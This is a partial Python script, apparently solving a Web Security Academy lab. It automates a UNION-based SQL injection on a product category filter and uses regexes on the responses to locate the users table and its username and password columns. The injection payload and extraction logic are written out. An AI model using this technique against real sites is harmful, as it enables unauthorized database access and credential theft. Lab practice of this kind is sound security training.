...
lab_id = '0a57004c049ccab9c06b112d00e6000a'  # change based on generated lab page id
uri = f"https://{lab_id}.web-security-academy.net/filter?category=" # contains the vulnerable sqli path
s = requests.Session()

# Using sqli query "'+UNION+SELECT+NULL,NULL--" to do the extractions 
...
def extract_user_table(sqli_query: str) -> str:
    ...
    for tr in parse.findAll('tr'):
        if re.search(r'users_[a-zA-Z]{6}$', tr.text.strip(), re.IGNORECASE): # Regex will search for the user_table from the striped html table data via query response. Table format is in *users_XXXXXX*.
...
def extract_user_columns(sqli_query: str) -> list:
    ...
    parse = BeautifulSoup(resp.text, 'lxml')
    for tr in parse.findAll('tr'):
        if re.search(r'username_[a-zA-Z]{6}$', tr.text.strip(), re.IGNORECASE) or re.search(r'password_[a-z]{6}$', tr.text.strip(), re.IGNORECASE): # Regex will search columns of the users table for username/password entries. Column format is in *username_XXXXXX*".
